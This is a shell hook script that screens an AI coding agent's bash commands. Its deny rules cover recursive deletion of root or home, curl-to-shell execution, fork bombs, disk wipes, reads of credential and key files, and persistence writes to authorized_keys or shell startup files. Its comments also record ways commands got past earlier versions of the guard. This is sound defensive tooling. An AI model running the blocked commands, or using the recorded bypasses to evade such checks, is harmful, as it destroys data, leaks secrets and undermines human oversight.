#!/bin/bash
# PreToolUse hook for Bash: deny patterns that are usually mistakes.
# Returns a structured PreToolUse decision via JSON on stdout.

# Body is mostly single-quoted grep regexes (literal $, \s, \b) plus a tr that
# collapses literal backslashes — both are intentional and trip SC2016/SC1003 as
# false positives, so disable those two info checks for the whole file.
# shellcheck disable=SC2016,SC1003
set -u

# Every decision below is routed through jq, so a PATH without jq made this hook exit 0
# with an empty stdout — i.e. the entire blocklist silently off, with nothing in the UI
# saying so. Verified: `rm -rf /` through a jq-free PATH returned rc=0 and no decision.
# The fallback is a hand-written literal so it has no dependency of its own, and it asks
# rather than denies: without jq the command cannot be parsed, so there is nothing to
# judge, and denying every Bash call outright would be indistinguishable from a hang.
# shellcheck source=/dev/null
. "${HOOK_INPUT_LIB:-${BASH_SOURCE[0]%/*}/hook-input.sh}"
hook_read_input
hook_require_jq ask "block-dangerous-bash: jq is unavailable, so the dangerous-command rules could not be evaluated. Review this command yourself." || exit 0

COMMAND=$(hook_field '.tool_input.command // empty')
[ -z "$COMMAND" ] && exit 0

# Normalized copy for the whole-string checks below: collapse newline/tab/backslash
# (so a `\`-continuation can't split a binary from its verb, or a flag from its
# target) and drop quote characters, which are grouping rather than content —
# without this, `rm -rf "$HOME"` reads as `rm -rf "$HOME"` and slips past the
# `\s\$HOME` anchor that catches the unquoted form.
SCAN=$(printf '%s' "$COMMAND" | tr '\n\t\\' '   ' | tr -d "\"'")

# --- M02 shadow census ----------------------------------------------------------------------
#
# SCAN above collapses a newline to a SPACE. That is conservative for a whole-string rule and
# fatal for a command-position-anchored one: the rules below anchor on `(^|[;&|])`, so a
# command after a newline is never in command position and never matched. Both verified this
# session against a scratch copy of this file:
#
#   printf 'echo x\nterraform destroy'   -> no decision   (`echo x; terraform destroy` denies)
#   printf 'echo x\nssh homelab reboot'  -> no decision   (`echo x && ssh …` denies)
#
# CMDPARSE_SHADOW=1 re-evaluates those two anchored families against each SEGMENT from
# cmdparse.sh, using the same regexes, and logs which families would newly fire. It changes
# no decision: nothing below reads BDB_NEW, and the log is written from an EXIT trap after
# this hook has already decided.
BDB_OLD=none
BDB_SHADOW=0
if [ "${CMDPARSE_SHADOW:-0}" = 1 ] && [ "${CMDPARSE:-on}" != off ]; then
  # shellcheck source=/dev/null
  if . "${CMDPARSE_LIB:-${BASH_SOURCE[0]%/*}/cmdparse.sh}" 2>/dev/null; then BDB_SHADOW=1; fi
fi

# shellcheck disable=SC2329  # invoked indirectly, from the EXIT trap installed below
_bdb_shadow_log() {
  [ "$BDB_SHADOW" = 1 ] || return 0
  local newly='' seg segscan i=0
  local status=unreadable nseg=0
  if cmd_parse "$COMMAND"; then
    status=$CP_STATUS
    nseg=$CP_NSEG
    while [ "$i" -lt "$CP_NSEG" ]; do
      # Same normalization this hook applies to the whole command, applied per segment.
      segscan=$(printf '%s' "${CP_SEG[i]}" | tr '\n\t\\' '   ' | tr -d "\"'")
      i=$((i + 1))
      # Only count a family as NEWLY visible if the whole-string form did not already
      # catch it — the census is of the gap, not of every match.
      if echo "$segscan" | grep -qiE "$SSH_AT_RE" && ! echo "$SCAN" | grep -qiE "$SSH_AT_RE"; then
        case $newly in *ssh*) ;; *) newly="$newly ssh" ;; esac
      fi
      if echo "$segscan" | grep -qiE "$TF_AT$TF_BIN\b([[:space:]]+-[^[:space:]]+)*[[:space:]]+(apply|destroy|import|taint|untaint|force-unlock)\b" \
        && ! echo "$SCAN" | grep -qiE "$TF_AT$TF_BIN\b([[:space:]]+-[^[:space:]]+)*[[:space:]]+(apply|destroy|import|taint|untaint|force-unlock)\b"; then
        case $newly in *terraform*) ;; *) newly="$newly terraform" ;; esac
      fi
    done
  else
    status=$CP_STATUS
  fi
  local logdir="${CLAUDE_SHADOW_LOG_DIR:-$HOME/.claude/logs}"
  mkdir -p "$logdir" 2>/dev/null && jq -cn \
    --arg ts "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
    --arg hook block-dangerous-bash \
    --arg cmd "$COMMAND" \
    --arg old "$BDB_OLD" \
    --arg status "$status" \
    --arg newly "${newly# }" \
    --argjson nseg "$nseg" \
    '{ts:$ts,hook:$hook,cmd:$cmd,old:$old,status:$status,nseg:$nseg,
      newly_anchored:(if $newly=="" then null else ($newly|split(" ")) end)}' \
    >> "$logdir/cmdparse-shadow.jsonl" 2>/dev/null
  return 0
}
[ "$BDB_SHADOW" = 1 ] && trap _bdb_shadow_log EXIT


# Catastrophic rm targets: root, root-with-a-glob (`rm -rf /*` erases the same tree
# but leaves no whitespace after the slash), home tilde, and $HOME.
#
# Every home form carries the `/?(\s|\*|$)` terminator so the match stops AT the home
# directory: `rm -rf ~` and `rm -rf $HOME/` are caught, `rm -rf $HOME/dev/build` is
# not. Without it, quote-stripping in SCAN exposes `$HOME` in every path beneath home
# and the hook denies ordinary work like `rm -rf "$HOME/dev/build"`.
HOME_TAIL='/?(\s|\*|$)'
RM_TARGET="(\\s/[[:space:]]|\\s/\$|\\s/\\*|\\s~$HOME_TAIL|\\s\\\$HOME$HOME_TAIL"
# ...and the home path written out in full (`rm -rf /home/you`), which none of the
# anchors above match.
if [ -n "${HOME:-}" ]; then
  HOME_RE=$(printf '%s' "$HOME" | sed 's/[][\\.*^$+?(){}|]/\\&/g')
  RM_TARGET="$RM_TARGET|\\s$HOME_RE$HOME_TAIL"
fi
RM_TARGET="$RM_TARGET)"

deny() {
  BDB_OLD=deny
  jq -n --arg reason "$1" '{
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: "deny",
      permissionDecisionReason: $reason
    }
  }'
  exit 0
}

# Remote-exec guardrail (ssh): the permission engine matches only the OUTER
# command, so `ssh host '<payload>'` reads as a bare `ssh` — the deny list
# (sudo/su/chown/…) never sees what runs on the far host, and the surrounding
# quotes hide the payload from the checks below (the rm -rf path anchor breaks on
# `ssh h 'rm -rf /'`, which ends in /'). Re-scan the payload so an agent can't do
# over ssh what it's denied locally. Deploys are unaffected: they carry no literal
# sudo (ansible uses become: internally). mkfs/dd/terraform/fork-bomb are already
# caught whole-string below; this closes only the quoting/prefix-match gaps.
# `hl` is covered too: allow-readonly-remote.sh auto-approves read-only `hl` verbs and
# leans on this block as its deny backstop, but the backstop only ever matched `ssh`,
# so a destructive `hl` payload degraded from denied to merely prompted.
#
# The wrapper must be in command position. Matching it after any whitespace treated
# every command that merely mentions ssh as a remote invocation, then scanned the whole
# string — so `sudo systemctl status ssh` was denied as "sudo inside an ssh command".
# Matched on COMMAND with nothing allowed before the binary, so `TERM=x ssh homelab
# reboot`, `command ssh homelab reboot` and `"ssh" homelab reboot` all slipped the whole
# remote block (verified: plain `ssh homelab reboot` matched, those three did not).
# Scan SCAN so quoting cannot hide the binary, and allow leading env assignments and
# wrapper words — the same idiom TF_AT already uses further down.
# Held in a variable so the M02 shadow census re-uses this exact rule per segment instead
# of a second copy of it.
SSH_AT_RE='(^|[;&|(])[[:space:]]*([A-Za-z_][A-Za-z0-9_]*=[^[:space:]]+[[:space:]]+|(command|env|exec|sudo|nohup|nice)[[:space:]]+)*([^[:space:];&|()]*/)?(ssh|hl)([[:space:]]|$)'
if echo "$SCAN" | grep -qiE "$SSH_AT_RE"; then
  # SCAN already stripped quotes and collapsed newline/tab/backslash, so payload
  # words have clean boundaries: `ssh h 'sudo rm -rf /'` -> `ssh h sudo rm -rf /`.
  REMOTE="$SCAN"
  ssh_hint="Run privileged or destructive remote commands in a direct session on the server, not from an agent session."
  echo "$REMOTE" | grep -qiE '\bsudo\b' && deny "Blocked: sudo inside a remote (ssh/hl) command. $ssh_hint"
  echo "$REMOTE" | grep -qiE '(^|[[:space:]])su[[:space:]]+(-|root|[a-z_])' && deny "Blocked: su inside a remote (ssh/hl) command. $ssh_hint"
  echo "$REMOTE" | grep -qiE "\brm\s+(-[a-zA-Z]*r[a-zA-Z]*f|-rf|-fr)\b.*$RM_TARGET" && deny "Blocked: rm -rf of home/root on the remote host. $ssh_hint"
  echo "$REMOTE" | grep -qiE '\bchown\b' && deny "Blocked: chown inside a remote (ssh/hl) command. $ssh_hint"
  echo "$REMOTE" | grep -qiE '\bchmod\s+(-[a-zA-Z]*\s+)*0?777\b' && deny "Blocked: chmod 777 inside a remote (ssh/hl) command. $ssh_hint"
  echo "$REMOTE" | grep -qiE '\b(reboot|poweroff|halt|shutdown)\b|\binit\s+[06]\b' && deny "Blocked: power-state change (reboot/shutdown/halt) on the remote host. $ssh_hint"
fi

# rm -rf targeting home or root (handles separated flags: rm -r -f /, rm --recursive --force /)
if echo "$SCAN" | grep -qiE "\brm\s+(-[a-zA-Z]*r[a-zA-Z]*f|-rf|-fr)\b.*$RM_TARGET"; then
  deny "Blocked: rm -rf targeting home or root directory. Use a specific path instead."
fi
if echo "$SCAN" | grep -qiE '\brm\s' && echo "$SCAN" | grep -qiE '(\s-[a-zA-Z]*r|\s--recursive)' && echo "$SCAN" | grep -qiE '(\s-[a-zA-Z]*f|\s--force)' && echo "$SCAN" | grep -qE "$RM_TARGET"; then
  deny "Blocked: rm -rf targeting home or root directory. Use a specific path instead."
fi

# Force-push to main / master (flag syntax and +refspec syntax) — always blocked
# Exclude --force-with-lease which is the safe variant.
# $SCAN, not $COMMAND: both patterns anchor on whitespace, so an adjacent quote character
# breaks them — `git push --force"" main` and `git push --force ""main` each read as a
# non-match and rode through. The rm and terraform rules already scan quote-stripped;
# these did not, which was the whole of the difference.
if echo "$SCAN" | grep -qE 'git\s+push.*(--force([ ]|$)|[ ]-f([ ]|$))' && ! echo "$SCAN" | grep -q '\-\-force-with-lease'; then
  if echo "$SCAN" | grep -qE '(^|[[:space:]]|:)(main|master)([[:space:]]|:|$)'; then
    deny "Blocked: force-push to main/master. Use a feature branch."
  fi
fi
if echo "$SCAN" | grep -qE 'git\s+push.*\+\s*(main|master|refs/heads/(main|master))\b'; then
  deny "Blocked: force-push via +refspec to main/master. Use a feature branch."
fi

# Any push whose DESTINATION is main/master, force or not. Both rules above sit
# behind a --force/-f gate, so `git push origin HEAD:main` — a plain fast-forward
# straight onto the default branch — rode through them; the settings deny-list
# enumerates only the literal `git push origin main` spelling and missed it too,
# and `Bash(git push:*)` sits in the host ALLOW list, so nothing prompted either.
# Runs after the two rules above so a force-push keeps its more specific message.
#
# Matches the DESTINATION side of a refspec: `git push origin main:feature`, which
# pushes main ONTO another branch, is left alone. A branch merely containing the
# word (`my-main-branch`, `feature/main`) does not match — the separator before it
# has to be whitespace or a colon.
#
# --force-with-lease to main is caught here even though the force rule exempts it.
# The lease only protects someone else's commits from being clobbered; it does not
# make main a legitimate push target. That is a deliberate change: it was
# previously allowed.
#
# NOT covered, and not coverable by a static scan: a bare `git push` while checked
# out on main. That needs the current branch, which this hook cannot know.
if echo "$SCAN" | grep -qE 'git[[:space:]]+push\b' \
  && echo "$SCAN" | grep -qE '([[:space:]]|:)(refs/heads/)?(main|master)([[:space:]]|$)'; then
  deny "Blocked: push targeting main/master. Push a feature branch and open a PR."
fi

# `gh api` mutations, in any flag spelling. The settings deny-lists (host and
# sandbox alike) enumerate one spelling per flag — `-X POST`, `--method POST`,
# `-f `, `-F `, `--input ` — all space-separated short forms. gh parses with pflag,
# so `--method=POST`, `-XPOST`, `--field k=v`, `--raw-field k=v` and `--input=f`
# are the same request and matched none of them; on the host `Bash(gh api:*)` is
# in ALLOW, so they ran unprompted. A glob list cannot express "any spelling",
# which is why this lives here instead.
#
# A field flag alone is enough: gh switches the default method from GET to POST as
# soon as any --field/--raw-field is present, so no method flag need appear.
# Matched at a command boundary so `gh` inside an argument or a path does not fire.
GH_API_AT='(^|[;&|(])[[:space:]]*([A-Za-z_][A-Za-z0-9_]*=[^[:space:]]+[[:space:]]+|(command|env|exec|sudo|nohup|nice)[[:space:]]+)*([^[:space:];&|()]*/)?gh[[:space:]]+api\b'
if echo "$SCAN" | grep -qE "$GH_API_AT"; then
  gh_hint="Read-only gh api is fine; a human runs the mutation."
  if echo "$SCAN" | grep -qiE '(^|[[:space:]])(-X|--method)[[:space:]]*=?[[:space:]]*(POST|PUT|PATCH|DELETE)\b'; then
    deny "Blocked: mutating gh api request (POST/PUT/PATCH/DELETE). $gh_hint"
  fi
  # -f/-F is the only short flag gh api spells with an f, so a cluster containing
  # one is unambiguous; --field/--raw-field are checked separately because the
  # leading `--` stops the short-flag pattern from reaching them.
  if echo "$SCAN" | grep -qE '(^|[[:space:]])(--field|--raw-field)([[:space:]]|=)'; then
    deny "Blocked: gh api field parameter, which makes the request a POST. $gh_hint"
  fi
  if echo "$SCAN" | grep -qE '(^|[[:space:]])-[a-zA-Z]*[fF]'; then
    deny "Blocked: gh api field parameter (-f/-F), which makes the request a POST. $gh_hint"
  fi
  if echo "$SCAN" | grep -qE '(^|[[:space:]])--input([[:space:]]|=)'; then
    deny "Blocked: gh api reading a request body from a file. $gh_hint"
  fi
  if echo "$SCAN" | grep -qE '(^|[[:space:]]|/)graphql\b'; then
    deny "Blocked: gh api graphql, which can mutate. $gh_hint"
  fi
fi

# A pipe into a shell. The original `\|\s*(sh|bash|zsh)` recognised only a bare
# interpreter word, so `curl -s http://x | /bin/bash` and `| sudo bash` both failed to
# match (verified against the old regex) and degraded from denied to merely prompted.
# Allow for a path to the interpreter and for the wrapper words that can precede it.
# Scan SCAN, not COMMAND: quotes are stripped there, so `| "bash"` cannot hide the word.
PIPE_WRAPPERS='((sudo|env|command|exec|nohup|nice|stdbuf|xargs)[[:space:]]+(-[^[:space:]]+[[:space:]]+)*)*'
PIPE_TO_SHELL="\|[[:space:]]*$PIPE_WRAPPERS([^[:space:]|;&]*/)?(sh|bash|zsh|dash|fish|ksh|ash)\b"

# `curl url | python3` executes downloaded code exactly as `| bash` does, but the language
# interpreters can't join PIPE_TO_SHELL: that regex also drives the generic rule below, and
# `cat local.json | python3 -m json.tool` is data processing, not execution. So they get their
# own pattern, used only on the curl/wget path, and it matches only a BARE interpreter — one
# given no script and no -c/-m, so stdin is the program. `python3 -` spells that explicitly.
PIPE_TO_INTERPRETER="\|[[:space:]]*$PIPE_WRAPPERS([^[:space:]|;&]*/)?(python[0-9.]*|node|deno|bun|perl|ruby|php)([[:space:]]+(-|/dev/stdin))?[[:space:]]*([;&|)]|\$)"

# Curl-pipe-to-shell
if echo "$SCAN" | grep -qE "(curl|wget)[^|]*($PIPE_TO_SHELL|$PIPE_TO_INTERPRETER)"; then
  deny "Blocked: piping remote content to an interpreter. Download, inspect, then run."
fi

# Same payload as curl|sh via process or command substitution — `bash <(curl url)`,
# `sh -c "$(wget -O- url)"`, `eval "$(curl url)"`. No literal pipe, so the rules
# above (and permissions.deny) never see it. Match on the raw command: the quote
# stripping in SCAN would leave `$(` intact but the pattern reads either form.
# The interpreter list matches the secrets rule below, since `python3 -c "$(curl …)"`
# runs downloaded code just as `bash <(curl …)` does. `.` needs its own alternative —
# a bare dot has no word boundary to anchor on — and the downloader may be given by
# path, so `curl` is matched with an optional leading directory.
# Backticks are the third substitution form and were missing: `eval `curl http://x``
# did not match while `bash -c "$(curl http://x)"` did, so a backticked download ran.
if echo "$COMMAND" | grep -qE '(\b(sh|bash|zsh|dash|fish|eval|source|python[0-9.]*|node|deno|bun|perl|ruby|php)\b|(^|[;&|(])[[:space:]]*\.[[:space:]])[^;&]*([<$]\(|`)[[:space:]]*([^[:space:]]*/)?(curl|wget)\b'; then
  deny "Blocked: executing downloaded content via process/command substitution. Download, inspect, then run."
fi

# Writing to protected files
if echo "$COMMAND" | grep -qE '>\s*(\.env|~?/\.ssh/|~?/\.aws/credentials)'; then
  deny "Blocked: writing to a secrets file. Ask the user to do this manually."
fi

# Fork bomb
if echo "$COMMAND" | grep -qE ':\(\)\{.*\};:'; then
  deny "Blocked: fork bomb detected."
fi

# Generic pipe-to-shell (belt-and-suspenders with permissions.deny)
if echo "$SCAN" | grep -qE "$PIPE_TO_SHELL"; then
  deny "Blocked: piping output to a shell interpreter. Download, inspect, then run."
fi

# Disk-wipe commands
if echo "$COMMAND" | grep -qE '\b(mkfs|dd\s+if=.*of=/dev/|fdisk|parted)\b'; then
  deny "Blocked: low-level disk operation."
fi

# Reading secret files via bash commands (bypasses Read deny rules).
# Best-effort: catches common readers, not obfuscated invocations.
# /proc/<pid>/environ and env-dumping paths belong here too — they carry exported
# tokens just as directly as a credentials file does.
# Declared in .chezmoidata/secrets.toml; tests/secret-registry.test.js fails if this
# list drifts from it. `.claude/.credentials.json` is the OAuth token store on Linux and
# WSL — a different file from `.claude.json`, and the one that was missing here.
SECRET_PATHS='(\.env|\.ssh/|id_rsa|id_ed25519|id_ecdsa|\.aws/credentials|\.aws/config|\.gnupg/|\.netrc|\.pypirc|\.npmrc|/secrets/|\.git-credentials|\.kube/config|\.docker/config\.json|\.config/gh/hosts\.yml|\.claude/\.credentials\.json|\.claude\.json|/etc/shadow|/etc/gshadow|/proc/[^/[:space:]]+/environ|\.pem|\.key|\.p12|\.pfx)'
# Content dumpers, searchers (grep/awk/sed), pagers, editors, hashers, and
# copy/exfil tools — any of these reading a secret path is a leak vector.
READERS='(cat|tac|nl|head|tail|less|more|most|bat|batcat|strings|xxd|hexdump|hd|od|base32|base64|uuencode|view|vi|vim|nvim|nano|emacs|ex|pico|grep|egrep|fgrep|rg|ag|ack|awk|gawk|mawk|sed|gpg|openssl|shasum|md5|md5sum|sha1sum|sha256sum|cp|install|rsync|scp|truncate|dd|tar|jq|yq|gojq|jaq)'
# Check every command segment, split on all separators: scanning only the args before
# the first pipe left `true | cat .env` unchecked, and splitting on `|` alone left
# anything chained after `;` or `&&` riding along inside a skipped segment.
#
# For a FILTERS command, drop that one leading pattern/filter argument before scanning.
# Dropping just the argument — rather than skipping the whole segment, as an earlier
# version did — is what keeps `ls | grep '\.pem'` from reading as a secret access while
# still catching `jq -r . ~/.aws/credentials`, which is why jq is in READERS above.
set -f   # $seg is deliberately word-split below; globbing it would rewrite the tokens
while IFS= read -r seg; do
  # shellcheck disable=SC2086  # word-splitting is intended here; globbing is off
  set -- $seg
  [ "$#" -eq 0 ] && continue
  case "${1##*/}" in
    grep|egrep|fgrep|rg|ag|ack|jq|yq|gojq|jaq)
      head=$1; shift
      while [ "$#" -gt 0 ]; do
        case $1 in -*) shift ;; *) shift; break ;; esac
      done
      seg="$head $*"
      ;;
  esac
  if printf '%s' "$seg" | grep -qE "\b$READERS\b.*$SECRET_PATHS"; then
    deny "Blocked: reading a secrets file via bash. Use a non-sensitive path or ask the user to share the specific value needed."
  fi
done <<< "$(printf '%s' "$SCAN" | tr ';&|' '\n')"
set +f
# Interpreters that can slurp a file (python -c 'open(".env")', node -e, perl, ...).
# Scan the whole command; requiring an interpreter keyword keeps jq '.key' from tripping.
if echo "$SCAN" | grep -qE "\b(python[0-9.]*|node|deno|bun|perl|ruby|php|Rscript|osascript)\b.*$SECRET_PATHS"; then
  deny "Blocked: reading a secrets file via an interpreter. Ask the user to share the specific value needed."
fi

# Writing to secret paths via pipe (tee) or redirection — check the full command.
#
# The path used to be pinned to `~?/?` immediately after the redirect, so only the
# tilde spelling matched: `echo k >> /home/daniel/.ssh/authorized_keys` and
# `echo k > /home/daniel/.aws/credentials` both NOMATCHed (verified against the old
# pattern). Let the directory prefix float instead.
#
# Shell startup files and the Claude hook/settings tree join the list here — appending
# an attacker key to authorized_keys or a line to .zshrc is the persistence move that
# outlives the session, and none of these were on the write side.
WRITE_TARGETS="($SECRET_PATHS|authorized_keys|\.bashrc|\.zshrc|\.bash_profile|\.zprofile|\.profile|\.claude/settings\.json|\.claude/hooks/)"
if echo "$SCAN" | grep -qE "(>>?|tee[[:space:]]+(-[^[:space:]]+[[:space:]]+)*)[[:space:]]*[^[:space:];&|]*$WRITE_TARGETS"; then
  deny "Blocked: writing to a secrets or shell-startup file. Ask the user to do this manually."
fi

# Terraform / OpenTofu / Terragrunt — deny state-mutating & destructive ops.
# Scan a NORMALIZED copy of the whole command: collapse newline/tab/backslash
# (defeats `\`-continuation splitting the binary from its verb across lines)
# and strip quote chars (defeats `"terraform" apply` / `terraform" "apply`),
# then grep. Catches compound/prefixed forms too (`cd x && terraform destroy`,
# `AWS_PROFILE=p tofu apply`). NOTE: static string-scanning cannot catch
# indirection (xargs/eval/$VAR) or write-a-script-then-run — see review notes.
# Read-only ops stay allowed: plan, validate, fmt, show, output, providers,
# graph, init, get, state list/show, workspace list/select.
TF_BIN='(terraform|tofu|terragrunt)'
TF_SCAN="$SCAN"
# The binary must be in command position (start, or after a separator, allowing leading
# env assignments). Matching it anywhere meant quote stripping exposed the words inside
# strings, so `git commit -m "document terraform apply steps"` was denied.
TF_AT='(^|[;&|])[[:space:]]*([A-Za-z_][A-Za-z0-9_]*=[^[:space:]]+[[:space:]]+)*'
# Destructive verb as the first token after the binary (optional global flags
# like -chdir=… in between). Also catches terragrunt apply-all/destroy-all,
# since the verb still appears as a whole word.
if echo "$TF_SCAN" | grep -qiE "$TF_AT$TF_BIN\b([[:space:]]+-[^[:space:]]+)*[[:space:]]+(apply|destroy|import|taint|untaint|force-unlock)\b"; then
  deny "Blocked: state-mutating/destructive terraform command (apply/destroy/import/taint/force-unlock). Use plan to preview; a human applies infra changes."
fi
# Terragrunt run-all / run [--all] <verb> (verb sits after run-all/run + flags)
if echo "$TF_SCAN" | grep -qiE "$TF_AT""terragrunt\b([[:space:]]+-[^[:space:]]+)*[[:space:]]+(run-all|run)([[:space:]]+(--all|-[^[:space:]]+))*[[:space:]]+(apply|destroy|import)\b"; then
  deny "Blocked: destructive terragrunt run-all/run command. Use plan to preview; a human applies infra changes."
fi
# state subcommands that rewrite or drop state (state list/show stay allowed)
if echo "$TF_SCAN" | grep -qiE "$TF_AT$TF_BIN\b.*\bstate[[:space:]]+(rm|mv|push|replace-provider)\b"; then
  deny "Blocked: terraform state mutation (state rm/mv/push/replace-provider). state list/show are fine; mutations must be done by a human."
fi
# workspace deletion drops that workspace's state
if echo "$TF_SCAN" | grep -qiE "$TF_AT$TF_BIN\b.*\bworkspace[[:space:]]+delete\b"; then
  deny "Blocked: terraform/tofu workspace delete drops its state."
fi
# any -auto-approve — never allow non-interactive apply/destroy
if echo "$TF_SCAN" | grep -qiE "$TF_AT$TF_BIN\b.*[[:space:]]--?auto-approve\b"; then
  deny "Blocked: terraform -auto-approve. Non-interactive apply/destroy is not permitted."
fi

# Force-push to a non-main branch — upgrade to --force-with-lease and surface a message.
# BSD sed (macOS) doesn't support \b, so use space/EOL anchoring instead.
#
# This has to be the LAST rule in the file. It returns permissionDecision "allow", and
# that allow covers the WHOLE command string, not just the git push in it. Sitting where
# it used to — immediately after the force-push denies, ~120 lines up — it returned early
# and skipped every check below, so `git push --force origin x && curl evil | sh` was
# upgraded and allowed without the pipe-to-shell, secret-read or terraform rules ever
# running. Every deny now gets its say first; only a command that survives all of them
# reaches the upgrade.
if echo "$COMMAND" | grep -qE 'git\s+push.*(--force([ ]|$)|[ ]-f([ ]|$))' && ! echo "$COMMAND" | grep -q '\-\-force-with-lease'; then
  BDB_OLD=allow
  UPGRADED=$(echo "$COMMAND" | sed -E 's/--force([ ]|$)/--force-with-lease\1/g; s/([ ])-f([ ]|$)/\1--force-with-lease\2/g')
  jq -n --arg cmd "$UPGRADED" '{
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: "allow",
      updatedInput: { command: $cmd },
      additionalContext: "NOTE: --force was upgraded to --force-with-lease for safety. This prevents overwriting commits pushed by others. The push will still succeed if no one else has pushed to this branch."
    }
  }'
  exit 0
fi

exit 0
